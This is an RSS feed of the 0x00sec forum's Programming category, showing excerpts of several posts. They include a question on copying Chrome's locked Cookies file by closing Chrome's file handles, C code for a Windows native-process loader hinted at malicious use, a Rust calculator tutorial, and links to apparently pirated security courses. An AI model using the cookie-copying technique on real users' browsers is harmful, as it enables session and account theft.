<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:discourse="http://www.discourse.org/" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>Programming - 0x00sec - The Home of the Hacker</title>
    <link>https://0x00sec.org/c/programming/61</link>
    <description>Topics in the &#39;Programming&#39; category </description>
    
      <lastBuildDate>Wed, 27 Dec 2023 06:05:13 +0000</lastBuildDate>
      <atom:link href="https://0x00sec.org/c/programming/61.rss" rel="self" type="application/rss+xml" />
        <item>
          <title>How can I rewrite this project using C#?</title>
          <dc:creator><![CDATA[pryoc110]]></dc:creator>
          <category>Programming</category>
          <description><![CDATA[
            <p>I want to implement a way to copy Chrome’s Cookies file to a specific directory, but the Cookies file will be occupied by Chrome making it impossible to copy it, I have learned that I can find the handles that occupy this file by traversing all the process handles and shutting them down so that I can copy the Cookies file without shutting down Chrome, but I only I found sample code written in C++, I tried to implement it in C#, but it didn’t close all handles successfully. How can I implement this C++ project completely using C#? Project address:<br>
<a href="https://www.dima.to/blog/how-to-enumerate-all-open-handles-for-all-processes-on-a-windows-machine/" class="onebox" target="_blank" rel="noopener nofollow ugc">https://www.dima.to/blog/how-to-enumerate-all-open-handles-for-all-processes-on-a-windows-machine/</a><br>
<img src="https://0x00sec.org/images/emoji/twitter/grinning.png?v=12" title=":grinning:" class="emoji only-emoji" alt=":grinning:" loading="lazy" width="20" height="20"></p>
            <p><small>4 posts - 3 participants</small></p>
            <p><a href="https://0x00sec.org/t/how-can-i-rewrite-this-project-using-c/38510">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/how-can-i-rewrite-this-project-using-c/38510</link>
          <pubDate>Wed, 27 Dec 2023 06:05:13 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-38510</guid>
          <source url="https://0x00sec.org/t/how-can-i-rewrite-this-project-using-c/38510.rss">How can I rewrite this project using C#?</source>
        </item>
        <item>
          <title>Quantum programming CTFs</title>
          <dc:creator><![CDATA[Lorakai]]></dc:creator>
          <category>Programming</category>
          <description><![CDATA[
            <p>I’m wondering if anyone here has any experience in quantum programming? An owner of a CTF site was wondering if it would be possible for me (using python and Qiskit) to program “something” capable of completing one of their CTF challenges. I was thinking maybe trying one of their crypto challenges, they were thinking maybe a programming challenge. Honestly don’t know if this type of thing is even possible. This isn’t a “fully functional” script, but it’s a simple example of some type of integration between Qiskit and Python<br>
</p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/6/d/6d658cc9156bf9c92228c9f20746663ad1bcac72.jpeg" data-download-href="/uploads/short-url/fBLC4kji34AM9PA6hFL6rBL0MQa.jpeg?dl=1" title="Screenshot_20231214-202800" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/6/d/6d658cc9156bf9c92228c9f20746663ad1bcac72_2_269x500.jpeg" alt="Screenshot_20231214-202800" data-base62-sha1="fBLC4kji34AM9PA6hFL6rBL0MQa" width="269" height="500" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/6/d/6d658cc9156bf9c92228c9f20746663ad1bcac72_2_269x500.jpeg, https://0x00sec.s3.amazonaws.com/optimized/3X/6/d/6d658cc9156bf9c92228c9f20746663ad1bcac72_2_403x750.jpeg 1.5x, https://0x00sec.s3.amazonaws.com/optimized/3X/6/d/6d658cc9156bf9c92228c9f20746663ad1bcac72_2_538x1000.jpeg 2x" data-dominant-color="474746"></a></div><p></p>
            <p><small>4 posts - 3 participants</small></p>
            <p><a href="https://0x00sec.org/t/quantum-programming-ctfs/38341">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/quantum-programming-ctfs/38341</link>
          <pubDate>Fri, 15 Dec 2023 01:15:08 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-38341</guid>
          <source url="https://0x00sec.org/t/quantum-programming-ctfs/38341.rss">Quantum programming CTFs</source>
        </item>
        <item>
          <title>I&#39;m curious if anyone would be willing to share their insights on a PHP vulnerability scanner?</title>
          <dc:creator><![CDATA[phpio]]></dc:creator>
          <category>Programming</category>
          <description><![CDATA[
            <p>We previously shared <a href="https://0x00sec.org/t/i-was-wondering-if-anyone-would-like-to-give-their-thoughts-on-a-php-vulnerability-scanner/37932">a post</a> and wanted to inform you that we’ve added a cool new feature to the scanner.</p>
<p>Great news! You asked - we delivered! When we first started, scanning your project required you  to click the Scan button and upload your code. You could package your project and upload it as one archive file, or upload up to 15 individual PHP files.</p>
<p>Our users asked us to add integrations with GitHub and GitLab to allow automated secure code checks to your CI/CD pipeline. Voila - now you can connect PHP Secure to your repository and run automated scans directly in your workflow!</p>
<p>Adding secure code checks to your existing workflow is easy. We have included all the step-by-step instructions to make it simple. Just follow the instructions carefully to set it up without a hitch.</p>
<p>Once connected, every time it is deployed, PHP Secure will check your project for vulnerabilities. Whenever new vulnerabilities are found, you’ll be notified. You can view your scan results in your PHP Secure account.</p>
<p>Keep your applications secure and prevent deployment of vulnerable applications or components (registries) by adding PHP Secure to the build as a step in the pipeline.</p>
<p>What do you think of this new feature?</p>
<p>We strive to be on the cutting edge and offer you a superior product for years to come! Do you have any suggestions for improvement?</p>
            <p><small>2 posts - 2 participants</small></p>
            <p><a href="https://0x00sec.org/t/im-curious-if-anyone-would-be-willing-to-share-their-insights-on-a-php-vulnerability-scanner/38291">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/im-curious-if-anyone-would-be-willing-to-share-their-insights-on-a-php-vulnerability-scanner/38291</link>
          <pubDate>Mon, 11 Dec 2023 00:13:50 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-38291</guid>
          <source url="https://0x00sec.org/t/im-curious-if-anyone-would-be-willing-to-share-their-insights-on-a-php-vulnerability-scanner/38291.rss">I&#39;m curious if anyone would be willing to share their insights on a PHP vulnerability scanner?</source>
        </item>
        <item>
          <title>A journey into the native lands of windows PART 2 :The closest you can get to absolute power</title>
          <dc:creator><![CDATA[Morpheus]]></dc:creator>
          <category>Programming</category>
          <description><![CDATA[
            <p>Here we meet again , cheerz<br>
beloved readers ,I write to you with very welcoming hands ,buckle up .<br>
not long ago i posted the first part on a subject about creating a native process you can look it up <a href="https://0x00sec.org/t/a-journey-into-the-native-lands-of-windows-part-1/34685">here</a> ,today we meet to code that very native program we’re going to run using our previously coded loader,I’ll try my best explaining every detail,and if by any chance I’ve missed something or you guys wanted a little bit more explanation feel free to ask.</p>
<p><strong>INTRO</strong><br>
a native process in my opinion is the closest you can get to launching a kernel driver without the hurdles that come with the latter , and it might be used in a malicious intent <em>wink wink</em><br>
our POC program is simple it’s going to create an empty text file on my desktop, very simple hah .but ain’t the sky is the limit they say.<br>
you must know that compiling such native apps is not an easy task like clicking a compiler button , the code itself is saved in a *.c extension .sadly I’m not going to explain how to compile the program in this topic but there is a lot of methods to do that either by using gcc compiler or windows driver’s kit.<br>
first of all we must include our native libraries</p>
<pre><code class="lang-auto">#include "ntddk.h"
#include "ntifs.h"
</code></pre>
<p>our entrypoint can be anything but i chose to go with the traditions and name it NTprocessStartup<br>
with PPEB structure as a parametere, and we will be using the native variant of the function CreateFile() that is NtCreateFile()<br>
the functions parameters are pretty easy and understandable you can read about it <a href="https://learn.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntcreatefile" rel="noopener nofollow ugc">here</a>.<br>
there is a structure that we need to initialize with a function called RtlInitializeObjectAttributes() named OBJECT_ATTRIBUTES , this structure have the following members <img src="https://0x00sec.org/images/emoji/twitter/sweat_smile.png?v=12" title=":sweat_smile:" class="emoji" alt=":sweat_smile:" loading="lazy" width="20" height="20"></p>
<pre><code class="lang-auto">ULONG Length
HANDLE RootDirectory
PUNICODE_STRING ObjectName
ULONG Attributes
PSECURITY_DESCRIPTOR SecurityDescriptor
PSECURITY_QUALITY_OF_SERVICE SecurityQualityOfService
</code></pre>
<p>anyhow I wanted to make this topic as short as possible and open the door for discussions so here is the final product</p>
<pre><code class="lang-auto">#include "ntddk.h"
#include "ntifs.h"


void NtProcessStartup(PPEB peb) {
	HANDLE fileh;
	IO_STATUS_BLOCK statusblock;

	NTSTATUS status;
	OBJECT_ATTRIBUTES ITACHI_ATT;
	UNICODE_STRING SASUKE;
	RtlInitUnicodeString(&amp;SASUKE, L"\\DosDevices\\C:\\********* \\fromme.txt");
	InitializeObjectAttributes(&amp;ITACHI_ATT, &amp;SASUKE, OBJ_CASE_INSENSITIVE, NULL,NULL);
	status = NtCreateFile(&amp;fileh, (GENERIC_WRITE | SYNCHRONIZE), &amp;ITACHI_ATT, &amp;statusblock, 0, FILE_ATTRIBUTE_NORMAL, 0, FILE_SUPERSEDE, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);

}
</code></pre>
<p>if we try to run our native app directly by double clicking it we will encounter this error</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/1/b/1bbf70cec13c434fb849c26ecf4b3de7562a8505.png" alt="fourth" data-base62-sha1="3Xt3bDgwCvTEWIwboYnq8qifPAp" width="552" height="145"></p>
<p>sorry the error is in french <img src="https://0x00sec.org/images/emoji/twitter/sweat_smile.png?v=12" title=":sweat_smile:" class="emoji" alt=":sweat_smile:" loading="lazy" width="20" height="20"> but it basically says you cannot run this app in win32 mode</p>
<p>but upon launching it using our loader we get this</p>
<p>i had to put a break-point because the process quickly terminates itself<br>
</p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/d/e/deeceb2b456890e4be6ebc0d1fe24cbf46b64d2b.png" data-download-href="/uploads/short-url/vO5AQl7lhM4dw1AFWJuir8sVBof.png?dl=1" title="firstone" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/3X/d/e/deeceb2b456890e4be6ebc0d1fe24cbf46b64d2b.png" alt="firstone" data-base62-sha1="vO5AQl7lhM4dw1AFWJuir8sVBof" width="690" height="215" data-dominant-color="262525"></a></div><p></p>
<p>and i get this in process hacker<br>
<img src="https://0x00sec.s3.amazonaws.com/original/3X/6/0/60efe1acf6b5ddfccf0aee957a82a601b9f3f5e2.png" alt="runnnnn" data-base62-sha1="dPxMqb7lsTv4WZJcdImM5ob8rw6" width="242" height="56"></p>
<p>and finally the text file we created<br>
<img src="https://0x00sec.s3.amazonaws.com/original/3X/1/4/14ccc2a416a814818b1c7f2f6acabb7dfb54dd4d.png" alt="third" data-base62-sha1="2Y0fh1ic41LqrQ4XuVhLnBsUyFT" width="68" height="59"></p>
<p>I hope this humble topic made you excited or curious to know more about the native applications<br>
see you soon</p>
            <p><small>7 posts - 4 participants</small></p>
            <p><a href="https://0x00sec.org/t/a-journey-into-the-native-lands-of-windows-part-2-the-closest-you-can-get-to-absolute-power/36471">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/a-journey-into-the-native-lands-of-windows-part-2-the-closest-you-can-get-to-absolute-power/36471</link>
          <pubDate>Fri, 18 Aug 2023 20:58:01 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-36471</guid>
          <source url="https://0x00sec.org/t/a-journey-into-the-native-lands-of-windows-part-2-the-closest-you-can-get-to-absolute-power/36471.rss">A journey into the native lands of windows PART 2 :The closest you can get to absolute power</source>
        </item>
        <item>
          <title>JOE (JOE&#39;s own editor) is an underrated editor</title>
          <dc:creator><![CDATA[loser]]></dc:creator>
          <category>Programming</category>
          <description><![CDATA[
            <p>Many people in our circles advocate for the use of Vim/Vi or Emacs because of the extensibility and efficient workflow. Unfortunately they advocate for said editors claiming they are the only ones being in any way efficient. An editor showing how false that assumption is, is JOE. JOE is similar to the older Borland Turbo editor and people who have liked the latter will surely feel like home.</p>
<p>Actually JOE is not one, but many editors, including Emacs, Wordstar and more. It can be edited with its configuration file, that you’ll find in /etc/joe/joerc and can copy to $HOME/.joerc (on Unix).<br>
For help press Ctrl-K+H and for settings press Ctrl-T. In the joerc you can select a color scheme (zenburn, wombat, ir_black, molokai, gruvbox and more). Just press Ctrl-T, head to the Color Scheme button, press, press tab and voila you have all the color schemes you can choose. That trick with tab works everywhere in the settings.</p>
<p>Similar to Vim, you can select a text, in JOE that works by default with Ctrl+Arrowkey. The region selected can be edited with a variety of commands. There are a handful commands on moving around: Ctrl-X for next word and Ctrl-Z for last word. Ctrl-KV for bottom of the file and Ctrl-KU for top of the file.</p>
<p>Syntax highlighting is supported too. And it is free software, so just edit something into it if you desire a feature. It works with Windows API, OpenBSD, NetBSD, FreeBSD, Minix3 and of course Linux.</p>
<p>Links:<br>
<a href="https://joe-editor.sourceforge.io/" rel="noopener nofollow ugc">Joe website</a><br>
<a href="https://ports.to/path/editors/joe.html" rel="noopener nofollow ugc">OpenBSD ports </a><br>
<a href="https://www.freshports.org/editors/joe/" rel="noopener nofollow ugc">FreeBSD ports</a><br>
<a href="https://aur.archlinux.org/packages/joe" rel="noopener nofollow ugc">Arch Linux AUR (its not available in the default repos)</a><br>
<a href="https://packages.debian.org/bookworm/joe" rel="noopener nofollow ugc">Debian package </a></p>
            <p><small>6 posts - 6 participants</small></p>
            <p><a href="https://0x00sec.org/t/joe-joes-own-editor-is-an-underrated-editor/36147">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/joe-joes-own-editor-is-an-underrated-editor/36147</link>
          <pubDate>Wed, 26 Jul 2023 20:52:31 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-36147</guid>
          <source url="https://0x00sec.org/t/joe-joes-own-editor-is-an-underrated-editor/36147.rss">JOE (JOE&#39;s own editor) is an underrated editor</source>
        </item>
        <item>
          <title>How to create a basic calculator in Rust</title>
          <dc:creator><![CDATA[TheAnalizer]]></dc:creator>
          <category>Programming</category>
          <description><![CDATA[
            <p>Hello all, as some people may know, their is a lot of ways to create something in rust, just like any other programming language. However, as someone who is learning rust, I’ve noticed there is a lack of resources, and is why I’m posting it.</p>
<p>Requirements:</p>
<ul>
<li>rust version 1.x and later.</li>
<li>VS code with the rust analyzer extension</li>
<li>Terminal for ease of use.</li>
</ul>
<p>you can create your project directory using:</p>
<blockquote>
<p>$ cargo new calc</p>
</blockquote>
<p>After running their should be a folder named calc and inside a src folder containing the main.rs script. You can open it up in your IDE<br>
of choice and it should look like this.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/e/4/e45c0c73fe3580b071fb5bca61e4129ca44ec180.png" data-download-href="/uploads/short-url/wAa4KlRBbfLkAWNaS1TYuJkArJK.png?dl=1" title="calc_0" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/e/4/e45c0c73fe3580b071fb5bca61e4129ca44ec180_2_690x371.png" alt="calc_0" data-base62-sha1="wAa4KlRBbfLkAWNaS1TYuJkArJK" width="690" height="371" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/e/4/e45c0c73fe3580b071fb5bca61e4129ca44ec180_2_690x371.png, https://0x00sec.s3.amazonaws.com/optimized/3X/e/4/e45c0c73fe3580b071fb5bca61e4129ca44ec180_2_1035x556.png 1.5x, https://0x00sec.s3.amazonaws.com/optimized/3X/e/4/e45c0c73fe3580b071fb5bca61e4129ca44ec180_2_1380x742.png 2x" data-dominant-color="252525"></a></div><p></p>
<p>Now that we have that open we can make the following changes to the file.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/1/0/101bc9f34e31146578e5f747dab6b55257d1e51e.png" data-download-href="/uploads/short-url/2ivaY1aUgFBLyxR9ZpFBF3BGPF4.png?dl=1" title="calc_1" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/1/0/101bc9f34e31146578e5f747dab6b55257d1e51e_2_690x371.png" alt="calc_1" data-base62-sha1="2ivaY1aUgFBLyxR9ZpFBF3BGPF4" width="690" height="371" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/1/0/101bc9f34e31146578e5f747dab6b55257d1e51e_2_690x371.png, https://0x00sec.s3.amazonaws.com/optimized/3X/1/0/101bc9f34e31146578e5f747dab6b55257d1e51e_2_1035x556.png 1.5x, https://0x00sec.s3.amazonaws.com/optimized/3X/1/0/101bc9f34e31146578e5f747dab6b55257d1e51e_2_1380x742.png 2x" data-dominant-color="252525"></a></div><p></p>
<p>You may notice we added std::io; to the script, this allows us to gather user input. We also added println!(); which we are going to use to tell the user what they can enter to get there operator. next we are going to add the following lines to the program. The following should all be in <code> Fn main()</code>.</p>
<pre><code class="lang-auto">// create user input line

let mut input_line: String = String::new(); // the input line
io::stdin()
    .read_line(&amp;mut input_line) // read the line 
    .expext("Failed to read line"); // because it does happen
let x: i32 = input_line.trim().parse().expect("Not an integer"); // store as variable

</code></pre>
<p>You might be asking yourself “<em>does it really take all that code to just gather input?</em>” Yes and that’s because Rust is a low level language. You are probably wondering what <code>i32</code> is, <code>i32</code> is a 32Bit signed integer type, it’s what tells rust how to use the variable.</p>
<pre><code class="lang-auto">// continuation of above
// create the if statements for the selected action
if x == 1 {
        {   
            println!("first number");
            let mut input_line: String = String::new();
            io::stdin()
                .read_line(&amp;mut input_line)
                .expect("Failed to read line");
            let num1: f32 = input_line.trim().parse().expect("Input is not an integer");

            println!("second number");
            let mut input_line: String = String::new();
            io::stdin()
                .read_line(&amp;mut input_line)
                .expect("Failed to read line");
            let num2: f32 = input_line.trim().parse().expect("Input is not an integer");
            
            let ans: f32 = num1 + num2; // calculate the answer as a floating point number
            println!("Answer {}", ans); // print out the answer
        }
}

if x == 2 {
        {   
            println!("first number");
            let mut input_line: String = String::new();
            io::stdin()
                .read_line(&amp;mut input_line)
                .expect("Failed to read line");
            let num1: f32 = input_line.trim().parse().expect("Input is not an integer");

            println!("second number");
            let mut input_line: String = String::new();
            io::stdin()
                .read_line(&amp;mut input_line)
                .expect("Failed to read line");
            let num2: f32 = input_line.trim().parse().expect("Input is not an integer");
            
            let ans: f32 = num1 - num2; // calculate the answer as a floating point number
            println!("Answer {}", ans); // print out the answer
        }
    }

    if x == 3 {
        {   
            println!("first number");
            let mut input_line: String = String::new();
            io::stdin()
                .read_line(&amp;mut input_line)
                .expect("Failed to read line");
            let num1: f32 = input_line.trim().parse().expect("Input is not an integer");

            println!("second number");
            let mut input_line: String = String::new();
            io::stdin()
                .read_line(&amp;mut input_line)
                .expect("Failed to read line");
            let num2: f32 = input_line.trim().parse().expect("Input is not an integer");
            
            let ans: f32 = num1 * num2; // calculate the answer as a floating point number
            println!("Answer {}", ans); // print out the answer
        }
    }

    if x == 4 {
        {   
            println!("first number");
            let mut input_line: String = String::new();
            io::stdin()
                .read_line(&amp;mut input_line)
                .expect("Failed to read line");
            let num1: f32 = input_line.trim().parse().expect("Input is not an integer");

            println!("second number");
            let mut input_line: String = String::new();
            io::stdin()
                .read_line(&amp;mut input_line)
                .expect("Failed to read line");
            let num2: f32 = input_line.trim().parse().expect("Input is not an integer");
            
            let ans: f32 = num1 / num2; // calculate the answer as a floating point number
            println!("Answer {}", ans); // print out the answer
        }
    }

}
</code></pre>
<p>Now we are pretty much done writing code, And I should explain how ownership works. ownership is like global and local scope, but without functions. To use ownership in rust you do the following.</p>
<pre><code class="lang-auto">// example of ownership
{
   println("hello world");
}
</code></pre>
<p>we also changed i32 over to f32 in case if our user needs to calculate something between two floating point numbers. With all that said I’m pretty much done, and feel free to ask questions.</p>
            <p><small>2 posts - 2 participants</small></p>
            <p><a href="https://0x00sec.org/t/how-to-create-a-basic-calculator-in-rust/35115">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/how-to-create-a-basic-calculator-in-rust/35115</link>
          <pubDate>Fri, 19 May 2023 02:06:58 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-35115</guid>
          <source url="https://0x00sec.org/t/how-to-create-a-basic-calculator-in-rust/35115.rss">How to create a basic calculator in Rust</source>
        </item>
        <item>
          <title>Resources To Learn Everything Hacking Related</title>
          <dc:creator><![CDATA[RiskLimit]]></dc:creator>
          <category>Programming</category>
          <description><![CDATA[
            <p>I’m sharing some material that will teach you <em>almost</em> everything about tech (programming, pentesting, security, networking, hardware etc.). The list will be updated as time goes.</p>
<p><a href="https://mega.nz/folder/MwczHJbI#aYW1ynwOYNF0XZ8dow5Tww" rel="noopener nofollow ugc">MEGA Download Link</a></p>
<p><code>Feel free to reply to this topic with your own collection of tech related resources</code> <img src="https://0x00sec.org/images/emoji/twitter/smiley.png?v=12" title=":smiley:" class="emoji" alt=":smiley:" loading="lazy" width="20" height="20"></p>
<p><strong>Additional Resources:</strong><br>
LOTS of Useful Data <a href="https://the-eye.eu/public/" class="inline-onebox" rel="noopener nofollow ugc">Index of /public/</a><br>
ZSecurity Course Bundle <a href="https://mega.nz/folder/CCQXiAbA#dX6lYqg2OM5Xie-wZDeVAQ" class="inline-onebox" rel="noopener nofollow ugc">16.06 GB folder on MEGA</a><br>
StationX Cybersecurity Course <a href="https://mega.nz/folder/j8JzmYjA#sR7N0SOy4fz40NpJ4p9AEw" class="inline-onebox" rel="noopener nofollow ugc">11.46 GB folder on MEGA</a><br>
eLearn Security Courses <a href="https://mega.nz/folder/cuYXhQxT#WABLdQtsLSf2O1WWEL8bjQ" rel="noopener nofollow ugc">eLearn MEGA Download LInk</a><br>
Lots Of Different Courses <a href="https://mega.nz/folder/1rBHzIyD#M-aTi-c1nC3OGNgpH8OqhA/folder/865A3YKA" class="inline-onebox" rel="noopener nofollow ugc">829.58 GB folder on MEGA</a><br>
Reverse Engineering and More <a href="https://mega.nz/folder/3Z5CHBYZ#N_clXkcOreaTlYek8pPeNg" class="inline-onebox" rel="noopener nofollow ugc">2.08 GB folder on MEGA</a><br>
Linux Privilege Escalation <a href="https://mega.nz/folder/GMgS1ZjI#TuGVRVEE89Z19XvdKLvVbA" class="inline-onebox" rel="noopener nofollow ugc">1.01 GB folder on MEGA</a></p>
<p>Repository of Computer Science Books <a href="https://github.com/EbookFoundation/free-programming-books/blob/main/books/free-programming-books-subjects.md#security--privacy" rel="noopener nofollow ugc">Github Programming Books &amp; MORE</a><br>
Repository of Security Courses <a href="https://github.com/EbookFoundation/free-programming-books/blob/main/courses/free-courses-en.md#security" rel="noopener nofollow ugc">Github Security Courses</a><br>
Repository of Cryptography Courses <a href="https://github.com/EbookFoundation/free-programming-books/blob/main/courses/free-courses-en.md#cryptography" rel="noopener nofollow ugc">Github Cryptography Courses</a><br>
The Pentest Book <a href="https://github.com/six2dez/pentest-book" rel="noopener nofollow ugc">Github Link</a></p>
<p>Repository of Red Teaming <a href="https://github.com/yeyintminthuhtut/Awesome-Red-Teaming" rel="noopener nofollow ugc">Github Red Team</a></p>
<p><em>NOTE: Some links might contain material unrelated to the topic, some might have duplicates.</em></p>
            <p><small>8 posts - 7 participants</small></p>
            <p><a href="https://0x00sec.org/t/resources-to-learn-everything-hacking-related/34818">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/resources-to-learn-everything-hacking-related/34818</link>
          <pubDate>Sun, 30 Apr 2023 10:26:14 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-34818</guid>
          <source url="https://0x00sec.org/t/resources-to-learn-everything-hacking-related/34818.rss">Resources To Learn Everything Hacking Related</source>
        </item>
        <item>
          <title>A journey into the Native lands of windows part 1</title>
          <dc:creator><![CDATA[Morpheus]]></dc:creator>
          <category>Programming</category>
          <description><![CDATA[
            <p>Hello Guys , this is my first topic I publish in the forum<br>
I’ve been a huge fan of the site for almost 3 years now ,so I’ve decided to register and interact and learn with you guys, I don’t know what took me this long to register to be honest <img src="https://0x00sec.org/images/emoji/twitter/sweat_smile.png?v=12" title=":sweat_smile:" class="emoji" alt=":sweat_smile:" loading="lazy" width="20" height="20"><br>
so here we go , I was very bored and decided I should code something for fun ,I had some earlier knowledge concerning windows native ground .<br>
some of you may know that native processes don’t just run with a simple call to CreateProcess() or other standard WINAPIs ,so I created a simple loader that can run native processes ,it can run a normal process but sometimes it gets some errors , I will not put the whole source code so you guys can keep on searching to make it work by your own ,I find that very informative, i 'll try to explain the important things , like very important parameters and workflows.</p>
<p><strong>First things first : functions implemented .</strong></p>
<p>RtlDosPathNameToNtPathName_U() :<br>
this function will take a normal TCHAR string containing the path of the file you want to launch “calc.exe” for example and convert it to an Nt Path ,what this means is that native functions don’t understand normal paths used commonly in windows (dos paths) for eg : “C:\masm32\text”<br>
instead it converts it to something like “??\C:\masm32\text”  it happens to relative paths also but let’s not get there so we can keep it short you can read more on these paths in this article i found it very <a href="https://mecanik.dev/en/posts/convert-dos-and-nt-paths-using-rtl-functions/" rel="noopener nofollow ugc">useful</a></p>
<p>RtlCreateProcessParameters() :<br>
this function initializes the process parameters structure to be passed to the next function , like the PEB inherited from the parent process , the commandline and other stuff .</p>
<p>RtlCreateUserProcess() :<br>
our native createprocess function  , this function creates our process in a suspended state and we have to resume the execution calling the next function</p>
<p>NtResumeThread() :<br>
this catches the first thread handle from our process parameters struct and executes it</p>
<p>NtWaitForSingleObject() :<br>
waits for a signal like it’s WINAPI counterpart “WaitForsingalObject” the only difference here is that the timeout parameter in our case going to be NULL and it’s equivalent t INFINITE in WinAPI</p>
<p>RtlDestroyProcessParameters():<br>
to destroy the process parameters structure</p>
<p>finally I present you with my minimal source code , keep in mind that this source code is not absolute there is so many methods to implement it some of which without using the NtResumeThread function and alote others ,</p>
<pre><code class="lang-auto">TCHAR original_path[512]=TEXT("......");
	UNICODE_STRING converted;
	PRTL_USER_PROCESS_PARAMETERS Process_parameters;
	RTL_USER_PROCESS_INFORMATION Process_information;


	if (!RtlDosPathNameToNtPathName_U(original_path, &amp;converted, NULL, NULL)) {
		printf("\n Cannot convert Path name ... \n");
		return -1;
	}
	if (!NT_SUCCESS(RtlCreateProcessParameters(&amp;Process_parameters, &amp;converted, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL))) {
		printf("\n RTL Process Parameters Struct cannot be Created ...\n");
		RtlFreeUnicodeString(&amp;converted);
		return -1;
	}
	if (!NT_SUCCESS(RtlCreateUserProcess(&amp;converted, OBJ_CASE_INSENSITIVE, Process_parameters, NULL, NULL, NULL, FALSE, NULL, NULL, &amp;Process_information))) {

		printf("\nThe process cannot be created ...\n");
		RtlDestroyProcessParameters(Process_parameters);
		RtlFreeUnicodeString(&amp;converted);
		return -1;
	}
	printf("\n Process Created ...\n");
	NtResumeThread(Process_information.ThreadHandle,NULL);
	printf("\n Waiting for the process to terminate ... \n");
	
	NtWaitForSingleObject(Process_information.ProcessHandle,FALSE ,NULL);
	printf("\n process terminated\n");
	RtlDestroyProcessParameters(Process_parameters);
	NtClose(Process_information.ThreadHandle);
	NtClose(Process_information.ProcessHandle);

	return 0;
}

</code></pre>
<p>POC : launching a project of mine<br>
</p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/c/d/cd0d949a4983c4c8388e8049d830b672109e092f.png" data-download-href="/uploads/short-url/tfYYBrXivXWvMfettLdTHc5Vz5B.png?dl=1" title="po&amp;amp;c" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/c/d/cd0d949a4983c4c8388e8049d830b672109e092f_2_690x253.png" alt="po&amp;c" data-base62-sha1="tfYYBrXivXWvMfettLdTHc5Vz5B" width="690" height="253" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/c/d/cd0d949a4983c4c8388e8049d830b672109e092f_2_690x253.png, https://0x00sec.s3.amazonaws.com/optimized/3X/c/d/cd0d949a4983c4c8388e8049d830b672109e092f_2_1035x379.png 1.5x, https://0x00sec.s3.amazonaws.com/optimized/3X/c/d/cd0d949a4983c4c8388e8049d830b672109e092f_2_1380x506.png 2x" data-dominant-color="AAAAAA"></a></div><p></p>
<p>I hope you guys find this post informative , any questions are very welcome I’ll try to answer any of them ,keeping in mind that I’m not in any form a professional , I’m just and individual who likes to learn and share and discuss knowledge .</p>
<p>see you soon ,</p>
            <p><small>10 posts - 4 participants</small></p>
            <p><a href="https://0x00sec.org/t/a-journey-into-the-native-lands-of-windows-part-1/34685">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/a-journey-into-the-native-lands-of-windows-part-1/34685</link>
          <pubDate>Mon, 24 Apr 2023 17:56:27 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-34685</guid>
          <source url="https://0x00sec.org/t/a-journey-into-the-native-lands-of-windows-part-1/34685.rss">A journey into the Native lands of windows part 1</source>
        </item>
        <item>
